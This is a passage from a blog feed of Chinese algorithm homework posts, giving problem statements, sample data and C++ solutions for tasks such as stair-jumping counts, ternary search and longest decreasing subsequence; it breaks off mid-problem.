class="built_in">std</span>::fixed&lt;&lt;m&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-C-跳台阶"><a href="#问题-C-跳台阶" class="headerlink" title="问题 C: 跳台阶"></a>问题 C: 跳台阶</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.</p><p>所得到的结果模1000000007</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> m=<span class="number">1000000007</span>;</span><br><span class="line"><span class="comment">/*int f(int n)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    if(n&lt;=1)</span></span><br><span class="line"><span class="comment">        return 1;</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        return (f(n-1)%m+f(n-2)%m)%m;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> f1=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> f2=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> t=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            t=((f1%m)+(f2%m))%m;</span><br><span class="line">            f1=f2;</span><br><span class="line">            f2=t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;f(n)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-奶牛的聚会"><a href="#问题-D-奶牛的聚会" class="headerlink" title="问题 D: 奶牛的聚会"></a>问题 D: 奶牛的聚会</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>农历新年马上就要到了，奶牛们计划举办一次聚会庆祝新年的到来。但是，奶牛们并不喜欢走太远的路，这会给他们的聚会带来消极情绪，当一头奶牛的消极指数为Wi，他参加聚会所需行走的距离为si，那么他就会给聚会带来Si3*Wi的消极情绪。所有奶牛所在位置都在一条直线上，已知所有奶牛的坐标和消极指数，求如何确定聚会地点，使得所有奶牛给聚会带来的消极情绪之和最小，输出消极情绪之和的最小值。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>第一行包含一个整数 Ca(Ca&lt;=20) ，表示有 Ca 组测试数据。</p><p>对于每组测试数据：第一行包含一个整数n(1&lt;=n&lt;=50000) ，表示奶牛的数量。接下来 n 行每行包含两个浮点数Si和wi (-10<sup>6</sup>&lt;=Si&lt;=10<sup>6</sup>, 0&lt;Wi&lt;15)。</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>对于每组测试数据，输出 “Case #c: ans” ，其中c表示测试数据编号，ans表示消极情绪之和的最小值，结果四舍五入为一个整数。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">5</span><br><span class="line">0.9 2</span><br><span class="line">1.4 4</span><br><span class="line">3.1 1</span><br><span class="line">6.2 1</span><br><span class="line">8.3 2</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Case #1: 300</span><br></pre></td></tr></table></figure><h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> inf = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">double</span> w[<span class="number">500005</span>];</span><br><span class="line"><span class="keyword">double</span> s[<span class="number">500005</span>];</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">(<span class="keyword">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> d=<span class="built_in">abs</span>(s[i]-x);</span><br><span class="line">        sum+=d*d*d*w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Ca;</span><br><span class="line">    <span class="keyword">double</span> l,r;</span><br><span class="line">    <span class="keyword">double</span> e=<span class="number">1e-6</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;Ca;</span><br><span class="line">    <span class="comment">//double s[50005];</span></span><br><span class="line">    <span class="comment">//int w[50005];</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=Ca;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//int n;</span></span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        l=inf;</span><br><span class="line">        r=-inf;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;s[i];</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;w[i];</span><br><span class="line">            l=min(l,s[i]);</span><br><span class="line">            r=max(r,s[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(r-l&gt;e)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">double</span> m1=(l+r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">double</span> m2=(m1+r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(f(m1)&gt;f(m2))</span><br><span class="line">                l=m1;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r=m2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;k&lt;&lt;<span class="string">": "</span>&lt;&lt;ll(f(l)+<span class="number">0.5</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-光合作用"><a href="#问题-E-光合作用" class="headerlink" title="问题 E: 光合作用"></a><strong>问题 E: 光合作用</strong></h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>蒜头是个爱学习的孩子，他总喜欢在生活中做一些小实验，这次蒜头想研究一下光合作用。蒜头的实验材料有如下几样：神奇的种子，普通的纸箱和一些光源。一开始，蒜头将种子均匀的种在了箱子底部，你可以将其看成 X 轴，种子的位置为 X 轴上的点。然后蒜头用纸板将箱子盖住，并在纸板上安装了一些光源（具体见图，顶上的为光源，光源两边与顶部的夹角都为45度，黄色部分为光照，绿色的为植物。）。神奇的种子会在有光的情况下一直向上生长直到没光为止。现在蒜头想知道当实验结束时每颗种子的高度是多少？</p><p><img src="http://192.168.173.163/JudgeOnline/upload/image/20180914/20180914132714_44771.png" alt="img"></p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>第一行输入一个整数 T，表示测试数据的组数。</p><p>每组数据的第一行是三个整数 n,m,h(1&lt;=n,m&lt;=1e5,0&lt;=m&lt;=1e5,1&lt;=h&lt;=1e4),n表示种子数(编号为1,2…n)，m表示光源数,h 表示箱子的高度。</p><p>接下来m行，每行一个整数Xi表示第i个光源在顶部的位置。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>对于每组测试数据，请输出n行，每行一个数表示第i颗种子的最终高度。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">7 1 2</span><br><span class="line">4</span><br><span class="line">4 4 1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><p>这题后来进行了几次重测，请同学们不要惊慌</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="keyword">int</span> mo[<span class="number">100005</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n,m,h;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;h;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;mo[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> min=<span class="number">1e5</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(mo[j]-i)&lt;min)</span><br><span class="line">                    min=<span class="built_in">abs</span>(mo[j]-i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((h-min)&lt;=<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="number">0</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;(h-min)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法作业（二）</title>
      <link href="/2019/10/21/%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A2/"/>
      <url>/2019/10/21/%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A2/</url>
      
        <content type="html"><![CDATA[<p>算法作业二。</p><a id="more"></a><h2 id="问题-A-单词排序"><a href="#问题-A-单词排序" class="headerlink" title="问题 A: 单词排序"></a>问题 A: 单词排序</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>小红学会了很多英文单词，妈妈为了帮小红加强记忆，拿出纸、笔，把 N 个单词写在纸上的一行里，小红看了几秒钟后，将这张纸扣在桌子上。妈妈问小红：“你能否将这 N 个单词按照字典排列的顺序，从小到大写出来？”小红按照妈妈的要求写出了答案。现在请你编写程序帮助妈妈检查小红的答案是否正确。注意：所有单词都由小写字母组成，单词两两之间用一个空格分隔。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>输入包含两行。</p><p>第一行仅包括一个正整数N(0&lt;N≤26)。</p><p>第二行包含N个单词，表示妈妈写出的单词，两两之间用一个空格分隔。</p><p>单个单词长度不超过1010。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>输出仅有一行。针对妈妈写出的单词，按照字典排列的顺序从小到大排列成一行的结果，每个单词后带一个空格。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">city boy tree student</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boy city student tree</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(s,s+n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;s[i];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-求数组的最长递减子序列"><a href="#问题-B-求数组的最长递减子序列" class="headerlink" title="问题 B: 求数组的最长递减子序列"></a>问题 B: 求数组的最长递减子序列</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>输出最长递减子序列，数字之间有一个空格。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">9 4 3 2 5 4 3 2</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 5 4 3 2</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">1010</span>],b[<span class="number">1010</span>],p[<span class="number">1010</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(b,<span class="number">1</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line">    <span class="built_in">memset</span>(p,<span class="number">-1</span>,<span class="keyword">sizeof</span>(p));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;a[j]&amp;&amp;(b[j]+<span class="number">1</span>)&gt;b[i])</span><br><span class="line">            &#123;</span><br><span class="line">                b[i]=b[j]+<span class="number">1</span>;</span><br><span class="line">                p[i]=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> maxn=<span class="number">0</span>,num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b[i]&gt;maxn)</span><br><span class="line">        &#123;</span><br><span class="line">            maxn=b[i];</span><br><span class="line">            num=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">stack</span> &lt;<span class="keyword">int</span>&gt;stk;</span><br><span class="line">    stk.push(a[num]);</span><br><span class="line">    <span class="keyword">while</span>(p[num]!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stk.push(a[p[num]]);</span><br><span class="line">        num=p[num];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!stk.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;stk.top()&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        stk.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-C-矩形滑雪场"><a href="#问题-C-矩形滑雪场" class="headerlink" title="问题 C: 矩形滑雪场"></a>问题 C: 矩形滑雪场</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>zcb喜欢滑雪。他来到了一个滑雪场，这个滑雪场是一个矩形，为了简便，我们用r行c列的矩阵来表示每块地形。为了得到更快的速度，滑行的路线必须向下倾斜。 例如样例中的那个矩形，可以从某个点滑向上下左右四个相邻的点之一。例如24-17-16-1，其实25-24-23…3-2-1更长，事实上这是最长的一条。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>第1行:两个数字r，c(1 ≤ r, c ≤ 100)，表示矩阵的行列。第2..r+1行:每行c个数，表示这个矩阵。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>仅一行:输出1个整数，表示可以滑行的最大长度。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5 5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">16 17 18 19 6</span><br><span class="line">15 24 25 20 7</span><br><span class="line">14 23 22 21 8</span><br><span class="line">13 12 11 10 9</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" 